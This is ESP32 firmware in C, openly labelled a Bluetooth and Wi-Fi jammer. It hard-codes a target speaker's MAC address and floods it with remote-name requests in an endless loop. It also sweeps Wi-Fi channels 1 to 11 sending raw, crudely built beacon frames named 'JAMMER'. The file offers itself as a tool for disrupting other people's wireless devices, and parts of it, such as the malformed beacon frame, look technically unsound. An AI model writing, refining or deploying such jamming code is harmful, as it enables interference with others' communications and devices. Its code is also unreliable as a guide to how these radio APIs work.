#include <stdio.h>
#include <string.h>
#include "esp_log.h"
#include "nvs_flash.h"
#include "esp_bt.h"
#include "esp_bt_main.h"
#include "esp_bt_device.h"
#include "esp_gap_bt_api.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

static const char *TAG = "BT_JAMMER";

// Target speaker Bluetooth MAC address (replace with your device's MAC)
static esp_bd_addr_t target_device = {0xf4, 0x4e, 0xfd, 0x03, 0xa6, 0xdc};

// GAP callback function
static void esp_gap_cb(esp_bt_gap_cb_event_t event, esp_bt_gap_cb_param_t *param) {
    switch (event) {
        case ESP_BT_GAP_READ_REMOTE_NAME_EVT:
            if (param->read_rmt_name.stat == ESP_BT_STATUS_SUCCESS) {
                ESP_LOGI(TAG, "Remote device name: %s", param->read_rmt_name.rmt_name);
            } else {
                ESP_LOGI(TAG, "Failed to read remote name");
            }
            break;
        case ESP_BT_GAP_DISC_RES_EVT:
            ESP_LOGI(TAG, "Device discovered: %02x:%02x:%02x:%02x:%02x:%02x",
                     param->disc_res.bda[0], param->disc_res.bda[1], param->disc_res.bda[2],
                     param->disc_res.bda[3], param->disc_res.bda[4], param->disc_res.bda[5]);
            break;
        default:
            ESP_LOGI(TAG, "GAP event: %d", event);
            break;
    }
}

// Wi-Fi jamming task
static void wifi_jammer_task(void *pvParameters) {
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    ESP_ERROR_CHECK(esp_wifi_start());

    for (int channel = 1; channel <= 11; channel++) {
        esp_err_t err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
        if (err != ESP_OK) {
            ESP_LOGE(TAG, "Failed to set Wi-Fi channel %d: %s", channel, esp_err_to_name(err));
            continue;
        }

        ESP_LOGI(TAG, "Wi-Fi jamming on channel %d", channel);

        uint8_t beacon_frame[200];
        memset(beacon_frame, 0, sizeof(beacon_frame));
        beacon_frame[0] = 0x80; // Management frame: Beacon
        beacon_frame[1] = 0x00;
        memcpy(&beacon_frame[24], "JAMMER", 6); // SSID
        for (int i = 0; i < 10; i++) {
            esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame, sizeof(beacon_frame), false);
            vTaskDelay(10 / portTICK_PERIOD_MS);
        }
    }
    vTaskDelete(NULL);
}

void app_main(void) {
    // Initialize NVS
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    // Initialize Bluetooth controller
    esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
    bt_cfg.mode = ESP_BT_MODE_CLASSIC_BT; // Use Classic Bluetooth only
    ret = esp_bt_controller_init(&bt_cfg);
    if (ret) {
        ESP_LOGE(TAG, "Bluetooth controller initialize failed: %s", esp_err_to_name(ret));
        return;
    }

    // Enable Bluetooth controller
    ret = esp_bt_controller_enable(ESP_BT_MODE_CLASSIC_BT);
    if (ret) {
        ESP_LOGE(TAG, "Bluetooth controller enable failed: %s", esp_err_to_name(ret));
        return;
    }

    // Initialize Bluedroid stack
    ret = esp_bluedroid_init();
    if (ret) {
        ESP_LOGE(TAG, "Bluedroid initialize failed: %s", esp_err_to_name(ret));
        return;
    }

    ret = esp_bluedroid_enable();
    if (ret) {
        ESP_LOGE(TAG, "Bluedroid enable failed: %s", esp_err_to_name(ret));
        return;
    }

    // Register GAP callback
    ret = esp_bt_gap_register_callback(esp_gap_cb);
    if (ret) {
        ESP_LOGE(TAG, "GAP callback register failed: %s", esp_err_to_name(ret));
        return;
    }

    // Set device name
    const char *dev_name = "BT_JAMMER";
    esp_bt_gap_set_device_name(dev_name);

    // Set to connectable but not discoverable
    esp_bt_gap_set_scan_mode(ESP_BT_CONNECTABLE, ESP_BT_NON_DISCOVERABLE);

    // Start Wi-Fi jamming task
    xTaskCreate(wifi_jammer_task, "wifi_jammer", 4096, NULL, 5, NULL);

    // Start Bluetooth jamming loop using name query as disturbance
    ESP_LOGI(TAG, "Starting Bluetooth jamming...");
    while (1) {
        esp_bt_gap_read_remote_name(target_device);
        ESP_LOGI(TAG, "Sent remote name request to target device");
        vTaskDelay(50 / portTICK_PERIOD_MS);
    }
}
